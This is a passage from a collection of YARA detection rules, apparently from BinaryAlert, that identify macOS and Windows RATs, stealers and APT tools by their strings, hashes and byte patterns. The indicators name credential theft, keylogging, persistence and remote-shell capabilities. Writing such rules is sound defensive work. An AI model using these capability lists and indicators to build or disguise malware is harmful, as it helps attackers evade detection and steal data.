		$e5 = "ags=" fullword ascii wide
		$e6 = "btnG=" fullword ascii wide
		$e7 = "oprnd=" fullword ascii wide
		$e8 = "itwm=" fullword ascii wide
		$e9 = "utm=" fullword ascii wide
		$e10 = "channel=" fullword ascii wide

	condition:
		BINARYALERT_Macho_PRIVATE and ( 5 of ( $a* ) or any of ( $b* ) or any of ( $c* ) or 4 of ( $d* ) or 5 of ( $e* ) )
}

rule BINARYALERT_Malware_Macos_Neoneggplant_Eggshell
{
	meta:
		description = "EggShell is an iOS and macOS post exploitation surveillance pentest tool written in Python."
		author = "@mimeframe"
		id = "274a34cc-9403-50e6-aa64-683a41bc30e6"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/neoneggplant/EggShell"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/macos/malware_macos_neoneggplant_eggshell.yara#L1-L24"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "34906db9398313ccb84e67bd98e94324c628aefe3efa6ba3cca2df042b42cbe7"
		score = 50
		quality = 80
		tags = ""

	strings:
		$a1 = "Created By Lucas Jackson (@neoneggplant)" wide ascii
		$a2 = "SET LHOST (Leave blank for" wide ascii
		$a3 = "SET LPORT (Leave blank for" wide ascii
		$b1 = "/tmp/.esplog" wide ascii
		$b2 = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" wide ascii
		$b3 = "keylogclear" wide ascii
		$b4 = "getpasscode" wide ascii
		$c1 = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" wide ascii
		$c2 = "getfacebook" wide ascii
		$c3 = "type is eggsu" wide ascii
		$c4 = "rmpersistence" wide ascii

	condition:
		all of ( $a* ) or 3 of ( $b* ) or 3 of ( $c* )
}

rule BINARYALERT_Malware_Macos_Proton_Rat_Generic
{
	meta:
		description = "No description has been set in the source file - BinaryAlert"
		author = "@mimeframe"
		id = "75cfaaff-e8d7-5cd4-953b-7d2011139725"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://objective-see.com/blog/blog_0x1D.html"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/macos/malware_macos_proton_rat_generic.yara#L3-L21"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "6a2d0c8b20efc3fa283176a4bc76d6fd"
		logic_hash = "b7d8660320564cba1d8e2d53d1fdc75509140c7e87a572b27931c62201df2d22"
		score = 75
		quality = 64
		tags = ""

	strings:
		$a1 = "SRWebSocket" nocase wide ascii
		$a2 = "SocketRocket" nocase wide ascii
		$b1 = "SSH tunnel not launched" nocase wide ascii
		$b2 = "SSH tunnel still running" nocase wide ascii
		$b3 = "SSH tunnel already launched" nocase wide ascii
		$b4 = "Entering interactive session." nocase wide ascii

	condition:
		BINARYALERT_Macho_PRIVATE and any of ( $a* ) and any of ( $b* )
}

rule BINARYALERT_Malware_Macos_Bella
{
	meta:
		description = "Bella is a pure python post-exploitation data mining tool & remote administration tool for macOS."
		author = "@mimeframe"
		id = "ca4ab508-8c97-5307-9aaf-db10cfd6ab35"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/Trietptm-on-Security/Bella"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/macos/malware_macos_bella.yara#L1-L22"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "b9c063b5ec8604958d3417ec8640da4314ebcf60ee55413a2f6fa8d138311614"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Verified! [2FV Enabled] Account ->" wide ascii
		$a2 = "There is no root shell to perform this command. See [rooter] manual entry." wide ascii
		$a3 = "Attempt to escalate Bella to root through a variety of attack vectors." wide ascii
		$a4 = "BELLA IS NOW RUNNING. CONNECT TO BELLA FROM THE CONTROL CENTER." wide ascii
		$b1 = "user_pass_phish" fullword wide ascii
		$b2 = "bella_info" fullword wide ascii
		$b3 = "get_root" fullword wide ascii
		$c1 = "Please specify a bella server." wide ascii
		$c2 = "What port should Bella connect on [Default is 4545]:" wide ascii

	condition:
		any of ( $a* ) or all of ( $b* ) or all of ( $c* )
}

rule BINARYALERT_Malware_Macos_Marten4N6_Evilosx
{
	meta:
		description = "EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."
		author = "@mimeframe"
		id = "2b2e62ca-f95c-55c5-aaf6-985aab49dfbb"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/Marten4n6/EvilOSX"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/macos/malware_macos_marten4n6_evilosx.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "3402ebf34fd507d0c317416bf77bb3d51b67c8b0f099ce68d15ade6a6a2e302a"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "icloud_phish_stop" fullword wide ascii
		$a2 = "icloud_contacts" fullword wide ascii
		$a3 = "itunes_backups" fullword wide ascii
		$a4 = "chrome_passwords" fullword wide ascii
		$a5 = "Starting EvilOSX..." wide ascii

	condition:
		4 of ( $a* )
}

rule BINARYALERT_Malware_Multi_Vesche_Basicrat
{
	meta:
		description = "cross-platform Python 2.x Remote Access Trojan (RAT)"
		author = "@mimeframe"
		id = "e07a684c-3a3d-5dd3-a540-2cc9a5a170dd"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/vesche/basicRAT"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/multi/malware_multi_vesche_basicrat.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "1503ce9de4e721903058c77b305ba057052d654ff1875ea880f4319c3e525a29"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "HKCU Run registry key applied" wide ascii
		$a2 = "HKCU Run registry key failed" wide ascii
		$a3 = "Error, platform unsupported." wide ascii
		$a4 = "Persistence successful," wide ascii
		$a5 = "Persistence unsuccessful," wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Malware_Multi_Pupy_Rat
{
	meta:
		description = "pupy - opensource cross platform rat and post-exploitation tool"
		author = "@mimeframe"
		id = "b26deb19-85b2-5d39-9ff2-0ab9017f3263"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/n1nj4sec/pupy"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/multi/malware_multi_pupy_rat.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "bb5d1e7f2aea94dc41efe75690ae31409e8f6305aa6c4ec0cd46922ee8fb7241"
		score = 75
		quality = 74
		tags = ""

	strings:
		$a1 = "dumping lsa secrets" nocase wide ascii
		$a2 = "dumping cached domain passwords" nocase wide ascii
		$a3 = "the keylogger is already started" nocase wide ascii
		$a4 = "pupyutils.dns" wide ascii
		$a5 = "pupwinutils.security" wide ascii
		$a6 = "-PUPY_CONFIG_COMES_HERE-" wide ascii

	condition:
		3 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Custom_Sniffer
{
	meta:
		description = "Rule to detect Moonlight Maze sniffer tools"
		author = "Kaspersky Lab"
		id = "a9f005e0-8d73-58ff-b010-d3ce08ffdb64"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_custom_sniffer.yara#L1-L20"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "466be027f567fe0afc88c82d94e4e0171b4b7d8f38d27a4c4a18cec4ca2b8b2f"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "7b86f40e861705d59f5206c482e1f2a5"
		md5_2 = "927426b558888ad680829bd34b0ad0e7"

	strings:
		$a1 = "/var/tmp/gogo" fullword
		$a2 = "myfilename= |%s|" fullword
		$a3 = "mypid,mygid=" fullword
		$a4 = "mypid=|%d| mygid=|%d|" fullword
		$a5 = "/var/tmp/task" fullword
		$a6 = "mydevname= |%s|" fullword

	condition:
		any of ( $a* )
}

rule BINARYALERT_Malware_Windows_Xrat_Quasarrat
{
	meta:
		description = "xRAT is a derivative of QuasarRAT; this catches both RATs."
		author = "@mimeframe"
		id = "f4db2402-3653-5525-a137-de2de29cef28"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/quasar/QuasarRAT"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_xrat_quasarrat.yara#L1-L31"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "92533157a62ccae5d1bdc9d0bb7511817422c6b5d75d013a15173cd1121d099e"
		score = 75
		quality = 30
		tags = ""

	strings:
		$a1 = ">> New Session created" wide ascii
		$a2 = ">> Session unexpectedly closed" wide ascii
		$a3 = ">> Session closed" wide ascii
		$a4 = "session unexpectedly closed" wide ascii
		$a5 = "cmd" fullword wide ascii
		$a6 = "/K" fullword wide ascii
		$b1 = "echo DONT CLOSE THIS WINDOW!" wide ascii
		$b2 = "ping -n 20 localhost > nul" wide ascii
		$b3 = "Downloading file..." wide ascii
		$b4 = "Visited Website" wide ascii
		$b5 = "Adding Autostart Item failed!" wide ascii
		$b6 = ":Zone.Identifier" wide ascii
		$c1 = "GetDrives I/O error" wide ascii
		$c2 = "/r /t 0" wide ascii
		$c3 = "desktop.ini" wide ascii
		$c4 = "WAN IP Address" wide ascii
		$c5 = "User refused the elevation request." wide ascii
		$c6 = "Process already elevated." wide ascii

	condition:
		5 of ( $a* ) or 5 of ( $b* ) or 5 of ( $c* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Loki
{
	meta:
		description = "Rule to detect Moonlight Maze Loki samples by custom attacker-authored strings"
		author = "Kaspersky Lab"
		id = "06eeb6a4-540f-51eb-86f9-4ab49543f645"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_loki.yara#L1-L27"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "9a403695ded6ff3626820ba0d4abde7ccd6f3fa6bfd8aa4ceaf0cc009d34c97f"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "14cce7e641d308c3a177a8abb5457019"
		md5_2 = "a3164d2bbc45fb1eef5fde7eb8b245ea"
		md5_3 = "dabee9a7ea0ddaf900ef1e3e166ffe8a"
		md5_4 = "1980958afffb6a9d5a6c73fc1e2795c2"
		md5_5 = "e59f92aadb6505f29a9f368ab803082e"

	strings:
		$a1 = "Write file Ok..." ascii wide
		$a2 = "ERROR: Can not open socket...." ascii wide
		$a3 = "Error in parametrs:" ascii wide
		$a4 = "Usage: @<get/put> <IP> <PORT> <file>" ascii wide
		$a5 = "ERROR: Not connect..." ascii wide
		$a6 = "Connect successful...." ascii wide
		$a7 = "clnt <%d> rqstd n ll kll" ascii wide
		$a8 = "clnt <%d> rqstd swap" ascii wide
		$a9 = "cld nt sgnl prcs grp" ascii wide
		$a10 = "cld nt sgnl prnt" ascii wide
		$a11 = "ork error" ascii fullword

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Cle_Tool
{
	meta:
		description = "Rule to detect Moonlight Maze 'cle' log cleaning tool"
		author = "Kaspersky Lab"
		id = "d875a3cf-cad1-509f-bb9f-27f0a3a9b79d"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_cle_tool.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "647d7b711f7b4434145ea30d0ef207b0"
		logic_hash = "8f75df1240b9e5e905492106265a7e1342db4140d715529933af4ba5c8ec6331"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "./a filename template_file" ascii wide
		$a2 = "May be %s is empty?" ascii wide
		$a3 = "template string = |%s|" ascii wide
		$a4 = "No blocks !!!"
		$a5 = "No data in this block !!!!!!" ascii wide
		$a6 = "No good line"

	condition:
		3 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Apt_Red_Leaves_Generic
{
	meta:
		description = "Red Leaves malware, related to APT10"
		author = "David Cannings"
		id = "e0067b05-eb4a-52ec-8f35-9336a631f03b"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Red%20Leaves/Source/Red%20Leaves%20technical%20note%20v1.0.md"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_apt_red_leaves_generic.yara#L1-L27"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "81df89d6fa0b26cadd4e50ef5350f341"
		logic_hash = "be03bba9d01e6584b5849514656fd7de866c478f343c0bc618d7dbeda1771696"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Feb 04 2015"
		$a2 = "I can not start %s"
		$a3 = "dwConnectPort" fullword
		$a4 = "dwRemoteLanPort" fullword
		$a5 = "strRemoteLanAddress" fullword
		$a6 = "strLocalConnectIp" fullword
		$a7 = "\\\\.\\pipe\\NamePipe_MoreWindows" wide
		$a8 = "RedLeavesCMDSimulatorMutex" wide
		$a9 = "(NT %d.%d Build %d)" wide
		$a10 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)" wide
		$a11 = "red_autumnal_leaves_dllmain.dll" wide ascii
		$a12 = "__data" wide
		$a13 = "__serial" wide
		$a14 = "__upt" wide
		$a15 = "__msgid" wide

	condition:
		7 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Apt_Whitebear_Binary_Loader_1
{
	meta:
		description = "The WhiteBear loader contains a set of messaging and injection components that support continued presence on victim hosts"
		author = "@fusionrace"
		id = "6b5709fd-a923-56b6-98ab-ae036f9d04c3"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://securelist.com/introducing-whitebear/81638/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_apt_whitebear_binary_loader_1.yara#L1-L22"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "b099b82acb860d9a9a571515024b35f0"
		logic_hash = "f6706c66a378b80d3cedf118a812d8add60e12b44402a30d941d08ff30c7ab1c"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "### PE STORAGE ###" wide ascii
		$a2 = "### CRYPTO 0 ###" wide ascii
		$a3 = "### EXTERNAL STORAGE ###" wide ascii
		$a4 = "### CRYPTO 1 ###" wide ascii
		$a5 = "### QUEUES ###" wide ascii
		$a6 = "### TRANSPORT ###" wide ascii
		$a7 = "### EXECUTION SUBSYSTEM ###" wide ascii
		$a8 = "### AUTORUN MANAGER ###" wide ascii
		$a9 = "### INJECT MANAGER ###" wide ascii
		$a10 = "### LOCAL TRANSPORT MANAGER ###" wide ascii

	condition:
		6 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Pony_Stealer
{
	meta:
		description = "Pony stealer malware"
		author = "@mimeframe"
		id = "77af81cb-36c7-56a7-bd89-14d79628e5c4"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://www.knowbe4.com/pony-stealer"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_pony_stealer.yara#L1-L21"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "5e52ce394c3be2a685dbb8f435e2f64f"
		logic_hash = "4d4e28e0d4d97412a9129a4abfadc130a464a2ababf46ca8f366a2a30b262261"
		score = 75
		quality = 50
		tags = ""

	strings:
		$a1 = "signons.sqlite" nocase wide ascii
		$a2 = "signons.txt" nocase wide ascii
		$a3 = "signons2.txt" nocase wide ascii
		$a4 = "signons3.txt" nocase wide ascii
		$a5 = "WininetCacheCredentials" nocase wide ascii
		$a6 = "moz_logins" nocase wide ascii
		$a7 = "encryptedPassword" nocase wide ascii
		$a8 = "FlashFXP" nocase wide ascii
		$a9 = "BulletProof" nocase wide ascii
		$a10 = "CuteFTP" nocase wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Encrypted_Keyloger
{
	meta:
		description = "Rule to detect Moonlight Maze encrypted keylogger logs"
		author = "Kaspersky Lab"
		id = "4f290d77-5cb5-5f07-98fd-1829e2f00e63"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_encrypted_keyloger.yara#L1-L11"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "cdcbe112ae394ce0922647904f70cfae626d413d1770b0e20d2ba49e1f4e2d2d"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = {47 01 22 2A 6D 3E 39 2C}

	condition:
		($a1 at 0 )
}

rule BINARYALERT_Malware_Windows_T3Ntman_Crunchrat
{
	meta:
		description = "HTTPS-based Remote Administration Tool (RAT)"
		author = "@mimeframe"
		id = "c5b0d183-8822-505a-a1ff-7d6f75a3f174"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/t3ntman/CrunchRAT"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_t3ntman_crunchrat.yara#L1-L19"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "b5216b2b30d22f3d3848e1fb6e4245c558366fb8cd35b70f10fa4e605e211204"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "<action>command<action>" wide ascii
		$a2 = "<action>upload<action>" wide ascii
		$a3 = "<action>download<action>" wide ascii
		$a4 = "cmd.exe" wide ascii
		$a5 = "application/x-www-form-urlencoded" wide ascii
		$a6 = "&action=" wide ascii
		$a7 = "&secondary=" wide ascii
		$a8 = "<secondary>" wide ascii
		$a9 = "<action>" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Malware_Windows_Remcos_Rat
{
	meta:
		description = "No description has been set in the source file - BinaryAlert"
		author = "@mimeframe"
		id = "420c135f-3150-5cb9-9c1c-105cd260d713"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://breaking-security.net/remcos/remcos-changelog/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_remcos_rat.yara#L1-L20"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "c8dafe143fe1d81ae6a3c0cd4724b272"
		logic_hash = "ec1ec69f628111235bafad8177482256ed571c064a81f01b6ec2643dccc926ad"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "[Following text has been pasted from clipboard:]" wide ascii
		$a2 = "[Chrome StoredLogins found, cleared!]" wide ascii
		$a3 = "[Firefox StoredLogins cleared!]" wide ascii
		$b1 = "getclipboard" wide ascii
		$b2 = "stopmiccapture" wide ascii
		$b3 = "downloadfromurltofile" wide ascii
		$b4 = "getcamsingleframe" wide ascii
		$c1 = "Breaking-Security.Net" wide ascii
		$c2 = "REMCOS v" wide ascii

	condition:
		any of ( $a* ) or 3 of ( $b* ) or all of ( $c* )
}

rule BINARYALERT_Malware_Windows_Apt_Whitebear_Binary_Loader_3
{
	meta:
		description = "The WhiteBear loader contains a set of messaging and injection components that support continued presence on victim hosts"
		author = "@fusionrace"
		id = "bdcc0c30-3aa7-5c92-8205-9b360d10ac59"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://securelist.com/introducing-whitebear/81638/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_apt_whitebear_binary_loader_3.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "b099b82acb860d9a9a571515024b35f0"
		logic_hash = "955aad2d72407baa7fb71e04b51557649a6f91633f5bdb1a8792e328a1587d23"
		score = 75
		quality = 80
		tags = ""

	strings:
		$c1 = "{531511FA-190D-5D85-8A4A-279F2F592CC7}" wide ascii
		$c2 = "IsLoaderAlreadyWork" wide ascii
		$c3 = "\\\\.\\pipe\\Winsock2\\CatalogChangeListener-%03x%01x-%01x" wide ascii
		$c4 = "\\\\.\\pipe\\Winsock2\\CatalogChangeListener-%02x%02x-%01x" wide ascii

	condition:
		all of ( $c* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Xk_Keylogger
{
	meta:
		description = "Rule to detect Moonlight Maze 'xk' keylogger"
		author = "Kaspersky Lab"
		id = "5623021d-0d70-59b3-ae30-522e81552da0"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_xk_keylogger.yara#L1-L22"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "430027b41aeda9a11dadec2e4d3dd2474852ff3a7656ed7128711a1574e66b8f"
		score = 75
		quality = 30
		tags = ""

	strings:
		$a1 = "Log ended at => %s"
		$a2 = "Log started at => %s [pid %d]"
		$a3 = "/var/tmp/task" fullword
		$a4 = "/var/tmp/taskhost" fullword
		$a5 = "my hostname: %s"
		$a6 = "/var/tmp/tasklog"
		$a7 = "/var/tmp/.Xtmp01" fullword
		$a8 = "myfilename=-%s-"
		$a9 = "/var/tmp/taskpid"
		$a10 = "mypid=-%d-" fullword
		$a11 = "/var/tmp/taskgid" fullword
		$a12 = "mygid=-%d-" fullword

	condition:
		3 of ( $a* )
}

rule BINARYALERT_Ccleaner_Backdoor
{
	meta:
		description = "Ccleaner 5.33 backdoor with a possible APT17/Group72 connection."
		author = "@fusionrace"
		id = "769e4fcb-9638-5a5b-8b73-a1cda3bc286a"
		date = "2017-12-14"
		modified = "2017-12-14"
		reference = "http://blog.talosintelligence.com/2017/09/ccleaner-c2-concern.html"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_ccleaner_backdoor.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "ce3fc54d58e337ab17e6f1ba7745c593210483c02ed3969059a8fe6682d87218"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "d488e4b61c233293bec2ee09553d3a2f"
		md5_2 = "b95911a69e49544f9ecc427478eb952f"
		md5_3 = "063b58879c8197b06d619c3be90506ec"
		md5_4 = "7690e414e130acf7c962774c05283142"

	strings:
		$s1 = "s:\\workspace\\ccleaner\\branches\\v5.33" fullword ascii wide

	condition:
		$s1
}

rule BINARYALERT_Malware_Windows_Apt_Whitebear_Binary_Loader_2
{
	meta:
		description = "The WhiteBear loader contains a set of messaging and injection components that support continued presence on victim hosts"
		author = "@fusionrace"
		id = "d97b7fe1-7ff3-5cc0-9085-140ed523421f"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://securelist.com/introducing-whitebear/81638/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_apt_whitebear_binary_loader_2.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "06bd89448a10aa5c2f4ca46b4709a879"
		logic_hash = "9bb7fc3b3bf7f91efbba128895bb61b5a1bbdb6625d84836956de5e884ae3fe1"
		score = 75
		quality = 80
		tags = ""

	strings:
		$b1 = "i cunt waiting anymore #%d" wide ascii
		$b2 = "lights aint turnt off with #%d" wide ascii
		$b3 = "Not find process" wide ascii
		$b4 = "CMessageProcessingSystem::Receive_TAKE_NOP" wide ascii
		$b5 = "CMessageProcessingSystem::Receive_TAKE_CAN_NOT_WORK" wide ascii

	condition:
		3 of ( $b* )
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_Loki2Crypto
{
	meta:
		description = "Rule to detect hardcoded DH modulus used in 1996/1997 Loki2 sourcecode; #ifdef STRONG_CRYPTO /* 384-bit strong prime */"
		author = "Costin Raiu, Kaspersky Lab"
		id = "eb5fc283-4994-5db5-965d-e90caad95f4c"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_loki2crypto.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "abb2093844af1b854a9deed5baab3f4d67bd1189a4520f697aa69b7441d9488c"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "19fbd8cbfb12482e8020a887d6427315"
		md5_2 = "ea06b213d5924de65407e8931b1e4326"
		md5_3 = "14ecd5e6fc8e501037b54ca263896a11"
		md5_4 = "e079ec947d3d4dacb21e993b760a65dc"
		md5_5 = "edf900cebb70c6d1fcab0234062bfc28"

	strings:
		$modulus = {DA E1 01 CD D8 C9 70 AF C2 E4 F2 7A 41 8B 43 39 52 9B 4B 4D E5 85 F8 49}

	condition:
		$modulus
}

rule BINARYALERT_Malware_Windows_Moonlightmaze_De_Tool
{
	meta:
		description = "Rule to detect Moonlight Maze 'de' and 'deg' tunnel tool"
		author = "Kaspersky Lab"
		id = "8b943c21-eac7-521d-8dc6-90d611aa4d92"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_moonlightmaze_de_tool.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "836331856200fde9792d3bf97d3a18b7f4497ceaae1cfceb0de7c2949e315b9c"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "4bc7ed168fb78f0dc688ee2be20c9703"
		md5_2 = "8b56e8552a74133da4bc5939b5f74243"

	strings:
		$a1 = "Vnuk: %d" ascii fullword
		$a2 = "Syn: %d" ascii fullword
		$a3 = {25 73 0A 25 73 0A 25 73 0A 25 73 0A}

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Malware_Windows_Winnti_Loadperf_Dll_Loader
{
	meta:
		description = "Winnti APT group; gzwrite64 imported from loadoerf.ini"
		author = "@mimeframe"
		id = "41444dd5-41b9-550c-9124-bc7f41326baa"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/winnti-abuses-github/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/windows/malware_windows_winnti_loadperf_dll_loader.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "879ce99e253e598a3c156258a9e81457"
